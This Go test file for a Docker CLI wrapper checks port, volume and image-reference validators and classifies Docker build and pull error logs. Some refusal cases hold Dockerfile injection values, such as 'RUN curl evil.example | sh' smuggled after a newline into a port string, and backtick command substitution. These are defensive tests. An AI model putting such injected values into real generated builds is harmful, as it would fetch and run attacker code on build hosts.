package dockercli

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestNormalizePort: a port declaration read out of an image somebody
// else authored ends up in a generated Dockerfile, so what may pass is
// as narrow here as it is for an image reference -- and what does pass
// comes back in docker's own spelling, so that a command carrying a
// declaration into an image writes it the same way however the image it
// came from wrote it.
func TestNormalizePort(t *testing.T) {
	for _, tc := range []struct {
		name string
		port string
		want string
	}{
		{"a bare port gains the protocol docker assumes", "8080", "8080/tcp"},
		{"a protocol already named is kept", "53/udp", "53/udp"},
		{"sctp too", "9/sctp", "9/sctp"},
		{"a range, which docker accepts in EXPOSE", "8080-8090", "8080-8090/tcp"},
		{"a range with a protocol", "8080-8090/udp", "8080-8090/udp"},
		{"surrounding space is not part of it", "  8080/tcp  ", "8080/tcp"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got, err := NormalizePort(tc.port)
			if err != nil {
				t.Fatalf("NormalizePort(%q) = %v", tc.port, err)
			}
			if got != tc.want {
				t.Errorf("NormalizePort(%q) = %q, want %q", tc.port, got, tc.want)
			}
		})
	}
}

func TestNormalizePortRefuses(t *testing.T) {
	for _, tc := range []struct {
		name string
		port string
	}{
		// The one that matters: a value with a newline in it would be
		// an instruction of its own in the generated build.
		{"an instruction smuggled into a port", "8080/tcp\nRUN curl evil.example | sh"},
		{"not a port at all", "http"},
		{"out of range", "70000"},
		{"zero", "0"},
		{"a range whose end is out of range", "8080-70000"},
		{"an inverted range where start is greater than end", "8090-8080"},
		{"an inverted range with protocol", "8090-8080/tcp"},
		{"a protocol docker has no name for", "8080/quic"},
		{"nothing", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got, err := NormalizePort(tc.port)
			if err == nil {
				t.Fatalf("NormalizePort(%q) = %q, want a refusal", tc.port, got)
			}
			// The message quotes what it was given, since a caller
			// dropping one of these has to say which it dropped.
			if !strings.Contains(err.Error(), "not a usable port declaration") {
				t.Errorf("error does not say what is wrong: %v", err)
			}
		})
	}
}

// packFailedLate is what `docker build` prints, on Docker 29.8.1, when
// a generated pack copies the guest-side parts in successfully and then
// fails two steps later -- here because the packing step wrote nothing
// to /out. Kept verbatim (only the image references are a real pack's
// rather than the reproduction's): the point of the test below is that
// the parts directory is in this log, in a step that succeeded, and
// that the failure is about something else entirely.
const packFailedLate = `docker build --file /tmp/granule-guest-pack-123/Dockerfile --tag guest:packed /tmp/granule-guest-pack-123: exit status 1: #6 [pack 3/5] COPY --from=ghcr.io/gke-labs/granule:latest /usr/local/share/granule/guest-parts/ /parts/
#6 DONE 0.3s

#7 [pack 4/5] RUN GUEST_DISK_EXTRA_MB=0 GRANULE_GUEST_VARIANT=auto     /bin/sh /parts/pack-guest /rootfs /parts /out/var/lib/granule/guest
#7 DONE 0.6s

#8 [stage-2 2/2] COPY --from=pack /out/var/lib/granule/guest/ /var/lib/granule/guest/
#8 ERROR: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::b5ovixcg2ezdkegc1lumic67n: "/out/var/lib/granule/guest": not found
------
 > [stage-2 2/2] COPY --from=pack /out/var/lib/granule/guest/ /var/lib/granule/guest/:
------
Dockerfile:34
--------------------
  32 |     
  33 |     FROM ghcr.io/gke-labs/granule:latest
  34 | >>> COPY --from=pack /out/var/lib/granule/guest/ /var/lib/granule/guest/
  35 |     
--------------------
ERROR: failed to build: failed to solve: failed to compute cache key: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::b5ovixcg2ezdkegc1lumic67n: "/out/var/lib/granule/guest": not found`

// partsMissing is the same daemon on the failure the message above was
// being mistaken for: the granule image really does not carry the parts
// directory, and the COPY that wants it is the step that fails.
const partsMissing = `docker build --file /tmp/granule-guest-pack-123/Dockerfile --tag guest:packed /tmp/granule-guest-pack-123: exit status 1: #6 [pack 3/5] COPY --from=ghcr.io/gke-labs/granule:old /usr/local/share/granule/guest-parts/ /parts/
#6 ERROR: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::l1rpiujg5nrz9cig19962b25m: "/usr/local/share/granule/guest-parts": not found
------
 > [pack 3/5] COPY --from=ghcr.io/gke-labs/granule:old /usr/local/share/granule/guest-parts/ /parts/:
------
Dockerfile:22
--------------------
  20 |     
  21 |     
  22 | >>> COPY --from=ghcr.io/gke-labs/granule:old /usr/local/share/granule/guest-parts/ /parts/
  23 |     
--------------------
ERROR: failed to build: failed to solve: failed to compute cache key: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::l1rpiujg5nrz9cig19962b25m: "/usr/local/share/granule/guest-parts": not found`

// TestBuildCouldNotFind: the two logs above end in the same four words,
// and one of them is about the parts directory and the other is not.
// Telling them apart is the whole job -- a build matched across its
// whole text sent callers off to rebuild a granule image that was never
// the problem.
func TestBuildCouldNotFind(t *testing.T) {
	const parts = "/usr/local/share/granule/guest-parts"
	for _, tc := range []struct {
		name string
		text string
		path string
		want bool
	}{
		{"the COPY that wants the parts is the step that failed", partsMissing, parts, true},
		{"a later step failed while the parts step succeeded", packFailedLate, parts, false},
		{"what that later failure was about is still recognized", packFailedLate, "/out/var/lib/granule/guest", true},
		// The classic builder's wording for the same thing, where the
		// path is a suffix of the daemon's own.
		{"the classic builder", "COPY failed: stat /var/lib/docker/overlay2/abc/merged/usr/local/share/granule/guest-parts/granule-container: no such file or directory", "/usr/local/share/granule/guest-parts/granule-container", true},
		// A failure that names neither: the caller gets docker's own
		// message, which is better than a confident wrong one.
		{"a build that failed on something else", "docker build .: exit status 1: ERROR: failed to solve: process \"/bin/sh -c apt-get install e2fsprogs\" did not complete successfully: exit code: 100", parts, false},
		{"nothing said at all", "", parts, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := BuildCouldNotFind(tc.text, tc.path); got != tc.want {
				t.Errorf("BuildCouldNotFind(_, %q) = %v, want %v", tc.path, got, tc.want)
			}
		})
	}
}

// The four logs below are Docker 29.8.1's, reproduced on 19 Sep 2026
// and kept verbatim down to the last twenty lines dockercli.Run keeps
// (only the local stand-in for the granule image is renamed to the
// published one). They are here because the phrasing is the daemon's:
// a matcher written from memory of what docker "says" when it cannot
// resolve a reference is a matcher that matches nothing on the daemon
// people are running.
//
// guestAuthDenied is a repository this machine has no token for --
// every ghcr.io pull from a machine that has not logged in. The failure
// is about a token and names no image at all; the only lines carrying
// the reference are the vertex buildkit failed on.
const guestAuthDenied = `docker build --file /tmp/granule-wrap-123/Dockerfile --tag app:vm /tmp/granule-wrap-123: exit status 1: #1 [internal] load build definition from Dockerfile
#1 transferring dockerfile: 269B done
#1 DONE 0.0s

#2 [internal] load metadata for ghcr.io/gke-labs/granule:latest
#2 DONE 0.1s

#3 [internal] load metadata for ghcr.io/gke-labs/granule-guest-rootfs:latest
#3 ERROR: failed to authorize: failed to fetch anonymous token: unexpected status from GET request to https://ghcr.io/token?scope=repository%3Agke-labs%2Fgranule-guest-rootfs%3Apull&service=ghcr.io: 403 Forbidden
------
 > [internal] load metadata for ghcr.io/gke-labs/granule-guest-rootfs:latest:
------
Dockerfile:1
--------------------
   1 | >>> FROM ghcr.io/gke-labs/granule-guest-rootfs:latest AS wrapped
   2 |     COPY --from=ghcr.io/gke-labs/granule:latest /usr/local/share/granule/guest-parts/granule-container /usr/local/bin/granule-container
   3 |     COPY container.json /etc/granule/container.json
--------------------
ERROR: failed to build: failed to solve: failed to fetch anonymous token: unexpected status from GET request to https://ghcr.io/token?scope=repository%3Agke-labs%2Fgranule-guest-rootfs%3Apull&service=ghcr.io: 403 Forbidden`

// guestRepoMissing is a repository that does not exist on a registry
// that answers anonymously. This one does name the reference beside the
// failure -- "failed to resolve source metadata for <ref>" -- which the
// one above does not.
const guestRepoMissing = `docker build --file /tmp/granule-wrap-123/Dockerfile --tag app:vm /tmp/granule-wrap-123: exit status 1: #2 [internal] load metadata for docker.io/library/no-such-guest:nope
#2 ...

#3 [internal] load metadata for ghcr.io/gke-labs/granule:latest
#3 DONE 0.1s

#2 [internal] load metadata for docker.io/library/no-such-guest:nope
#2 ERROR: pull access denied, repository does not exist or may require authorization: server message: insufficient_scope: authorization failed
------
 > [internal] load metadata for docker.io/library/no-such-guest:nope:
------
Dockerfile:1
--------------------
   1 | >>> FROM docker.io/library/no-such-guest:nope AS wrapped
   2 |     COPY --from=ghcr.io/gke-labs/granule:latest /usr/local/share/granule/guest-parts/granule-container /usr/local/bin/granule-container
   3 |     COPY container.json /etc/granule/container.json
--------------------
ERROR: failed to build: failed to solve: docker.io/library/no-such-guest:nope: failed to resolve source metadata for docker.io/library/no-such-guest:nope: pull access denied, repository does not exist or may require authorization: server message: insufficient_scope: authorization failed`

// packerTagMissing is a tag that was never pushed to a repository that
// does exist, which is the one shape of unresolvable reference that
// does say "not found" -- and says it about the reference rather than
// about a path, which is why the two questions have to be asked apart.
const packerTagMissing = `docker build --file /tmp/granule-guest-pack-123/Dockerfile --tag guest:packed /tmp/granule-guest-pack-123: exit status 1: #2 [internal] load metadata for ghcr.io/gke-labs/granule:latest
#2 DONE 0.1s

#3 [internal] load metadata for docker.io/library/debian:no-such-tag-123
#3 ERROR: docker.io/library/debian:no-such-tag-123: not found
------
 > [internal] load metadata for docker.io/library/debian:no-such-tag-123:
------
Dockerfile:1
--------------------
   1 | >>> FROM debian:no-such-tag-123 AS pack
   2 |     RUN apt-get update && apt-get install -y e2fsprogs
   3 |     FROM ghcr.io/gke-labs/granule:latest
--------------------
ERROR: failed to build: failed to solve: debian:no-such-tag-123: failed to resolve source metadata for docker.io/library/debian:no-such-tag-123: docker.io/library/debian:no-such-tag-123: not found`

// guestRanAndFailed is the other side of all three: the guest image
// resolved perfectly well, and a shell wrap runs *inside* it failed six
// steps later. The reference is in this log five times, once at the head
// of the failing vertex's own block, and none of them is a registry's
// answer about it.
const guestRanAndFailed = `docker build --file /tmp/granule-wrap-123/Dockerfile --tag app:vm /tmp/granule-wrap-123: exit status 1: #7 [wrapped 2/3] COPY --from=ghcr.io/gke-labs/granule:latest /usr/local/share/granule/guest-parts/granule-container /usr/local/bin/granule-container
#7 DONE 0.2s

#8 [wrapped 3/3] RUN set -eu;     chmod 0755 /usr/local/bin/granule-container;     [ -d /etc/systemd ] || [ -d /etc/runlevels ] ||       { echo "ghcr.io/gke-labs/granule-guest-rootfs:latest runs neither systemd nor OpenRC, so nothing would start the container" >&2; exit 1; }
#8 2.051 ghcr.io/gke-labs/granule-guest-rootfs:latest runs neither systemd nor OpenRC, so nothing would start the container
#8 ERROR: process "/bin/sh -c set -eu;     chmod 0755 /usr/local/bin/granule-container;     [ -d /etc/systemd ] || [ -d /etc/runlevels ] ||       { echo \"ghcr.io/gke-labs/granule-guest-rootfs:latest runs neither systemd nor OpenRC, so nothing would start the container\" >&2; exit 1; }" did not complete successfully: exit code: 1
------
 > [wrapped 3/3] RUN set -eu;     chmod 0755 /usr/local/bin/granule-container;     [ -d /etc/systemd ] || [ -d /etc/runlevels ] ||       { echo "ghcr.io/gke-labs/granule-guest-rootfs:latest runs neither systemd nor OpenRC, so nothing would start the container" >&2; exit 1; }:
2.051 ghcr.io/gke-labs/granule-guest-rootfs:latest runs neither systemd nor OpenRC, so nothing would start the container
------
Dockerfile:3
--------------------
   2 |     COPY --from=ghcr.io/gke-labs/granule:latest /usr/local/share/granule/guest-parts/granule-container /usr/local/bin/granule-container
   3 | >>> RUN set -eu; \
   4 | >>>     chmod 0755 /usr/local/bin/granule-container; \
   5 |     
--------------------
ERROR: failed to build: failed to solve: process "/bin/sh -c set -eu;     chmod 0755 /usr/local/bin/granule-container;     [ -d /etc/systemd ] || [ -d /etc/runlevels ] ||       { echo \"ghcr.io/gke-labs/granule-guest-rootfs:latest runs neither systemd nor OpenRC, so nothing would start the container\" >&2; exit 1; }" did not complete successfully: exit code: 1`

// TestBuildCouldNotResolve: the question is which reference a build
// could not resolve, asked of logs where the reference is everywhere and
// the failure may be about something else entirely.
func TestBuildCouldNotResolve(t *testing.T) {
	const guest = "ghcr.io/gke-labs/granule-guest-rootfs:latest"
	const granule = "ghcr.io/gke-labs/granule:latest"
	for _, tc := range []struct {
		name string
		text string
		ref  string
		want bool
	}{
		{"a repository this machine has no token for", guestAuthDenied, guest, true},
		{"and not the image in that same build that resolved", guestAuthDenied, granule, false},
		{"a repository that does not exist", guestRepoMissing, "docker.io/library/no-such-guest:nope", true},
		{"a tag that was never pushed", packerTagMissing, "debian:no-such-tag-123", true},
		{"the guest resolved and a step inside it failed", guestRanAndFailed, guest, false},
		// A build that failed on a path, which is BuildCouldNotFind's
		// question and not this one -- the parts directory is named by a
		// COPY and by the checksum failure, and neither is a registry
		// answering about the granule image.
		{"a missing path in an image that resolved", partsMissing, "ghcr.io/gke-labs/granule:old", false},
		// The deprecated classic builder, which says it in one line: the
		// first for a tag, the second for a repository it names without
		// the tag.
		{"the classic builder on a missing tag", `Step 1/2 : FROM ghcr.io/gke-labs/granule-guest-rootfs:latest AS wrapped
failed to resolve reference "ghcr.io/gke-labs/granule-guest-rootfs:latest": docker.io/library/busybox:no-such-tag-123: not found`, guest, true},
		{"the classic builder on a missing repository", `Step 1/2 : FROM no-such-guest:nope AS wrapped
pull access denied for no-such-guest, repository does not exist or may require 'docker login'`, "no-such-guest:nope", true},
		{"nothing said at all", "", guest, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := BuildCouldNotResolve(tc.text, tc.ref); got != tc.want {
				t.Errorf("BuildCouldNotResolve(_, %q) = %v, want %v", tc.ref, got, tc.want)
			}
		})
	}
}

// The two questions are asked with different words because the daemon
// answers them with different words: neither of the logs a modern daemon
// prints for an unresolvable reference says "not found" or "no such
// file" about that reference, which is how the missing-guest-image
// advice came to fire on nothing at all.
func TestBuildCouldNotFindDoesNotAnswerForAReference(t *testing.T) {
	const guest = "ghcr.io/gke-labs/granule-guest-rootfs:latest"
	if BuildCouldNotFind(guestAuthDenied, guest) {
		t.Errorf("a 403 from a registry was read as a missing path")
	}
	if BuildCouldNotFind(guestRepoMissing, "docker.io/library/no-such-guest:nope") {
		t.Errorf("a repository that does not exist was read as a missing path")
	}
}

// TestPullCouldNotResolve: the same question of the commands that reach
// a registry without building anything, whose wording is a third thing
// again -- and whose failures are not all the registry's, which is the
// half worth getting right: every command here reads the granule image
// with `docker create` before it builds, so this decides whether a
// paragraph about registries and logins is printed over a daemon that
// ran out of disk.
func TestPullCouldNotResolve(t *testing.T) {
	for _, tc := range []struct {
		name string
		text string
		want bool
	}{
		// Docker 29.8.1, reproduced 19 Sep 2026 against real registries.
		{"a repository this machine has no token for", "docker create ghcr.io/gke-labs/granule:latest granule-reads-this-image-and-runs-nothing: exit status 1: Unable to find image 'ghcr.io/gke-labs/granule:latest' locally\nError response from daemon: error from registry: denied\ndenied", true},
		{"a repository that does not exist", "docker pull no-such-guest:nope: exit status 1: Error response from daemon: pull access denied for no-such-guest, repository does not exist or may require 'docker login'", true},
		{"a tag that was never pushed", `docker pull busybox:no-such-tag-123: exit status 1: Error response from daemon: failed to resolve reference "docker.io/library/busybox:no-such-tag-123": docker.io/library/busybox:no-such-tag-123: not found`, true},
		{"a registry that does not resolve", `docker create registry.invalid.example/team/granule:latest granule-reads-this-image-and-runs-nothing: exit status 1: Unable to find image 'registry.invalid.example/team/granule:latest' locally
Error response from daemon: failed to resolve reference "registry.invalid.example/team/granule:latest": failed to do request: Head "https://registry.invalid.example/v2/team/granule/manifests/latest": dial tcp: lookup registry.invalid.example on 8.8.8.8:53: no such host`, true},
		// Not the registry's answer: the daemon's, the disk's, the
		// image's. These keep docker's own message and no advice.
		{"a daemon that ran out of disk", "docker create granule:latest granule-reads-this-image-and-runs-nothing: exit status 1: Error response from daemon: no space left on device", false},
		{"an image built for another platform", "docker create granule:latest granule-reads-this-image-and-runs-nothing: exit status 1: Error response from daemon: image with reference granule:latest was found but does not match the specified platform", false},
		{"no docker at all", "docker create granule:latest granule-reads-this-image-and-runs-nothing: exec: \"docker\": executable file not found in $PATH", false},
		{"nothing said at all", "", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := PullCouldNotResolve(tc.text); got != tc.want {
				t.Errorf("PullCouldNotResolve(%q) = %v, want %v", tc.text, got, tc.want)
			}
		})
	}
}

func TestNormalizeVolumePath(t *testing.T) {
	for _, tc := range []struct {
		name string
		vol  string
		want string
	}{
		{"standard path", "/var/log/nginx", "/var/log/nginx"},
		{"trailing slash cleaned", "/var/log/", "/var/log"},
		{"double slash cleaned", "/var//log", "/var/log"},
		{"trimmed whitespace", "  /data/db  ", "/data/db"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got, err := NormalizeVolumePath(tc.vol)
			if err != nil {
				t.Fatalf("NormalizeVolumePath(%q) = %v", tc.vol, err)
			}
			if got != tc.want {
				t.Errorf("NormalizeVolumePath(%q) = %q, want %q", tc.vol, got, tc.want)
			}
		})
	}
}

func TestNormalizeVolumePathRefuses(t *testing.T) {
	for _, tc := range []struct {
		name string
		vol  string
	}{
		{"empty", ""},
		{"whitespace only", "   "},
		{"relative path", "data/db"},
		{"root path", "/"},
		{"newlines", "/var/log\nRUN evil"},
		{"quotes", "/var/\"data\""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got, err := NormalizeVolumePath(tc.vol)
			if err == nil {
				t.Fatalf("NormalizeVolumePath(%q) = %q, want refusal", tc.vol, got)
			}
		})
	}
}

// TestNotFoundKnowsEachDaemonsWording: "this image does not carry that
// path" is an answer rather than a failure -- a guest that brings no
// kernel of its own is the ordinary guest -- and the sentence the daemon
// answers it with is the daemon's own. An unrecognized one turns every
// cheap rebase of an ordinary guest into an error, which is what Docker
// 29.8.1's wording did until it was added here.
func TestNotFoundKnowsEachDaemonsWording(t *testing.T) {
	for _, tc := range []struct {
		name   string
		stderr string
		want   bool
	}{
		{"older daemons", "Error: No such container:path: c-abc:/var/lib/granule/guest/vmlinuz", true},
		{"docker 29", "Error response from daemon: Could not find the file /var/lib/granule/guest/vmlinuz in container 893da721b2e0", true},
		{"a missing directory", "lstat /var/lib/granule/guest: no such file or directory", true},
		{"not found in", "Error: path /var/lib/granule/guest/vmlinuz not found in container c-abc", true},
		// Anything else is a failure to read the image, not an answer
		// about it, and has to stay one.
		{"a daemon that is not there", "Cannot connect to the Docker daemon at unix:///var/run/docker.sock", false},
		{"nothing said at all", "", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := NotFound(tc.stderr); got != tc.want {
				t.Errorf("NotFound(%q) = %v, want %v", tc.stderr, got, tc.want)
			}
		})
	}
}

func TestValidateRef(t *testing.T) {
	for _, valid := range []string{
		"debian:12",
		"ghcr.io/gke-labs/granule:latest",
		"localhost:5000/myimage@sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
		"ubuntu:22.04+extra.1-2",
	} {
		if err := ValidateRef(valid); err != nil {
			t.Errorf("ValidateRef(%q) = %v, want nil", valid, err)
		}
	}

	for _, invalid := range []string{
		"debian:12\nRUN curl evil.com",
		"my image:latest",
		"$HOME/image",
		"`id`",
		"-bad-start",
	} {
		if err := ValidateRef(invalid); err == nil {
			t.Errorf("ValidateRef(%q) = nil, want error", invalid)
		}
	}
}

func TestLastLines(t *testing.T) {
	input := "line1\nline2\nline3\nline4\nline5\n"
	if got := LastLines(input, 3); got != "line3\nline4\nline5" {
		t.Errorf("LastLines(input, 3) = %q, want line3\nline4\nline5", got)
	}
	if got := LastLines(input, 10); got != "line1\nline2\nline3\nline4\nline5" {
		t.Errorf("LastLines(input, 10) = %q", got)
	}
}

func TestHumanSize(t *testing.T) {
	if got := HumanSize(2 * (1 << 30)); got != "2.0 GiB" {
		t.Errorf("HumanSize(2GiB) = %q", got)
	}
	if got := HumanSize(500 * (1 << 20)); got != "500 MiB" {
		t.Errorf("HumanSize(500MiB) = %q", got)
	}
	if got := HumanSize(1024); got != "1024 B" {
		t.Errorf("HumanSize(1024) = %q", got)
	}
}

func TestCLIBin(t *testing.T) {
	c1 := &CLI{}
	if c1.bin() != "docker" {
		t.Errorf("c1.bin() = %q, want 'docker'", c1.bin())
	}
	c2 := &CLI{Binary: "/usr/bin/custom-docker"}
	if c2.bin() != "/usr/bin/custom-docker" {
		t.Errorf("c2.bin() = %q, want '/usr/bin/custom-docker'", c2.bin())
	}
}

func TestCLIRunAndOutput(t *testing.T) {
	cli := &CLI{Binary: "echo"}
	out, err := cli.Output(context.Background(), "hello", "world")
	if err != nil {
		t.Fatalf("cli.Output failed: %v", err)
	}
	if strings.TrimSpace(out) != "hello world" {
		t.Errorf("cli.Output = %q, want 'hello world'", out)
	}

	var buf bytes.Buffer
	if err := cli.Run(context.Background(), &buf, &buf, "test-run"); err != nil {
		t.Fatalf("cli.Run failed: %v", err)
	}
	if strings.TrimSpace(buf.String()) != "test-run" {
		t.Errorf("cli.Run output = %q, want 'test-run'", buf.String())
	}
}

// TestBinary: $GRANULE_DOCKER chooses the container CLI everything
// falls back to, and an unset or blank one leaves it at "docker".
func TestBinary(t *testing.T) {
	for _, tc := range []struct {
		env  string
		want string
	}{
		{"", "docker"},
		{"   ", "docker"},
		{"podman", "podman"},
		{" /opt/bin/nerdctl\n", "/opt/bin/nerdctl"},
	} {
		t.Setenv(EnvBinary, tc.env)
		if got := Binary(); got != tc.want {
			t.Errorf("GRANULE_DOCKER=%q: Binary() = %q, want %q", tc.env, got, tc.want)
		}
		if got := (&CLI{}).bin(); got != tc.want {
			t.Errorf("GRANULE_DOCKER=%q: (&CLI{}).bin() = %q, want %q", tc.env, got, tc.want)
		}
	}

	// A binary named outright still wins over the environment.
	t.Setenv(EnvBinary, "podman")
	if got := (&CLI{Binary: "/usr/bin/custom-docker"}).bin(); got != "/usr/bin/custom-docker" {
		t.Errorf("explicit Binary = %q, want /usr/bin/custom-docker", got)
	}
}

// TestBinaryLookedUpOnPATH: a bare name in $GRANULE_DOCKER is found on
// PATH, the way "podman" or "nerdctl" would be.
func TestBinaryLookedUpOnPATH(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/sh\necho \"my-container-cli $*\"\n"
	if err := os.WriteFile(filepath.Join(dir, "my-container-cli"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	t.Setenv(EnvBinary, "my-container-cli")

	out, err := (&CLI{}).Output(context.Background(), "version")
	if err != nil {
		t.Fatalf("Output: %v", err)
	}
	if strings.TrimSpace(out) != "my-container-cli version" {
		t.Errorf("output = %q, want the PATH-resolved CLI to have run", out)
	}
}
